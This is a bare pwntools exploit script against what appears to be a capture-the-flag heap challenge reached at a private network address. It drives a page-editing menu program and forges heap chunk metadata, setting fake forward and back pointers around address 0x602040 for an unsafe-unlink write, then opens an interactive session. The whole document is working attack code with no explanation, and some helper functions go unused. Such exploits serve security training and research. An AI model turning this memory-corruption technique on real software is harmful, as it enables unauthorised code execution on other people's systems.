from pwn import *

s = remote('192.168.50.4',1234)
raw_input()
def edit_page(dat):
  s.recvuntil('6.exit')
  s.send('2\n')
  s.recvuntil('page:')
  s.send(dat)
def tear_page(size,dat):
  s.recvuntil('6.exit')
  s.send('3\n')
  s.recvuntil('(bytes):')
  s.send(str(size)+'\n')
  s.recvuntil('page:')
  s.send(dat)
def change_name(dat):
  s.recvuntil('6.exit')
  s.send('4\n')
  s.recvuntil('name:')
  s.send(dat)
def change_title(dat):
  s.recvuntil('6.exit')
  s.send('5\n')
  s.recvuntil('title:')
  s.send(dat)
change_name('A'*0x10+p64(0x602040-0x18)+p64(0x602040-0x10)+p64(0x20)+'\x40')
edit_page('\x00'*0x30+p64(0x0)+p64(0x40)+'\n')
s.interactive()
